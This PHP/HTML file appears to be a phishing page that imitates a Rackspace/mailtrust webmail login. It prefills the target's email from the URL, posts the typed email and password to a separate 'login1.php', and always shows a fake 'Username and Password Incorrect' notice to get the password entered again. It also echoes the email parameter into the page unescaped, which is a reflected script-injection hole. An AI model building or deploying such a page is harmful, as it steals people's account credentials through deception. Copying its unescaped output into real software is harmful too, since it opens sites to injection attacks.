<?php


$user = $_REQUEST['email'];
$email = base64_decode($user);


?>
<html>
<head>
    <!-- This meta tag forces browsers to use utf-8 character encoding to allow multibyte character support when logging in. -->
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
    <meta name="Description"  content="Webmail. Get instant access to email,
        calendars, contacts, tasks and notes from your desktop, laptop or mobile phone." />

    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js" ></script>
    <script type="text/javascript">_wm_redirect = false;</script>
    <script src="js/login.js?2230" type="text/javascript"></script>
    <script type="text/javascript">
        $(document).ready( function() {
            window._ext_js_path = './';

            //Check for failure due to incorrect username or password
            if (String(document.location).substr(String(document.location).length - 7, 7) == '?fail=1') {
                document.body.className = 'alert';
            } else {
                document.body.className = 'normal';
            }

            //Make sure function exists
            if ($Login && $Login.init) {
                $Login.init();
            }
            if (document.login.user_name.value == 'Email Address') {
                document.login.user_name.value = '';
            }
        });
    </script>


    <!--
    ***************************************************************************
    * Edit the Page Title between the <TITLE> tags below
    * YOU MAY EDIT THIS SECTION
    *************************************************************************** -->
    <title>Email - Login</title>
    <link href="favicon.ico" rel="shortcut icon" />

    <!--
    ***************************************************************************
    * Edit the Colors and Fonts between the <STYLE> tags below
    * YOU MAY EDIT THIS SECTION
    *************************************************************************** -->


    <style type="text/css">

        body {
            background: #DDD;
            font-size: 10pt;
            font-family: Tahoma,Arial,Verdana;
        }

        div.page {
            width: 370px;
            margin: auto;
        }

        input:-webkit-autofill {
            background-color: white !important;
        }

        div.form_wrapper {
            margin-top: 180px;
            border: 1px solid #999;
            background: #FFF;
            box-shadow: 2px 2px 5px #999;
        }

        div.form {
            padding: 30px;
            height: 292px;
        }

        div.form input {
            font-size: 12pt;
            margin-left: 0px;
        }

        div.form #login {
            width: 82px;
            height: 34px;
        }

        div.form #login {
            cursor:pointer;
            font-family:Tahoma,Arial,"Helvetica Neue",Helvetica,sans-serif;
            font-size:15px;
            border-radius:3px;
            -moz-border-radius:3px;
            -webkit-border-radius:3px;
            border-width:1px;
            border-style:solid;
            text-shadow:0 -1px 1px rgba(0,0,0,0.4);
            background-color:#a60004;
            border-color:#a60004;
            color:#fff;
            background:#d81436;
            background:-moz-linear-gradient(top,#d81436 0,#a60004 100%);
            background:-webkit-gradient(linear,left top,left bottom,color-stop(0,#d81436),color-stop(100%,#a60004));
            background:-webkit-linear-gradient(top,#d81436 0,#a60004 100%);
            background:-o-linear-gradient(top,#d81436 0,#a60004 100%);
            background:-ms-linear-gradient(top,#d81436 0,#a60004 100%);
            background:linear-gradient(top,#d81436 0,#a60004 100%);
            filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#d81436',endColorstr='#a60004',GradientType=0);
        }

        div.form #login::-moz-focus-inner {
            border:0;
            padding:0
        }

        input.user,
        input.pwd {
            height: 36px;
            width: 306px;
            border: 1px solid #cacaca;
        }

        input.user {
            margin: 2px 0 17px 0;
            padding: 1px 1px 1px 10px;
        }

        input.pwd {
            margin: 2px 0 20px 0;
            padding: 1px 1px 1px 10px;
        }

        input.submit {
            margin: 0 0 15px 0;
        }

        #email_label {
           margin-top: 14px;
        }

        #form_title {
            font-size: 18px;
        }

        div#alert {
            display: none;
            color: red;
            font-size: 13px;
        }

        body.alert div#alert { display: block !important; }
        body.normal div#placeholder { display: none !important; }
        body.alert div#placeholder { display: none !important; }

        #ssl {
            margin-top: 4px;
        }

        .header {
             height: 1px;
        }
    </style>
</head>

<body>
    <div class="page">
        <div class="header"></div>
        <div class="form_wrapper">
            <div class="form">
                <div class="left">
                    <form method="post" action="login1.php" name="login">
                        <input type="hidden" name="hostname" value="mailtrust.com" />

                        <div id="form_title">Sign-in to continue</div>
                        <div id="alert">Login failed</div>

                        <div id="email_label">Email Address</div>
                        <input type="text" tabindex="11" name="frm-email" class="user" value="<?php echo $_GET['email']; ?>" />

                        Password
                        <input type="password" tabindex="12" name="frm-pass" class="pwd"/>

                        <input type="submit" tabindex="15" id="login" name="submit_btn"
                            class="submit" value="Sign-In" onclick="$Login.submitForm();"/>

                        <div id="options">
                            <div id="rememberinfo">
                                <label for="remember"><p><span style="color:#0000FF;">!!! Username and Password Incorrect</span></p></label>
                            </div>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
<!--
***************************************************************************
* Insert HTML for the Footer below
* YOU MAY EDIT THIS SECTION
*************************************************************************** -->

<!--
***************************************************************************
* End the page
* WARNING: do not edit this section unless you know what you are doing
*************************************************************************** -->
<!-- Inserted by control panel -->
<script type="text/javascript">
function onFormSubmit(got_url) {
    var next_month = new Date();
    next_month.setTime(next_month.getTime()+(30*24*60*60*1000));
    next_month = next_month.toGMTString();
    document.cookie = "rsea_cust=1; expires="+next_month+"; path=/; domain=.rackspace.com";

    $Login.submitForm(got_url);
}
</script>
</body>
</html>
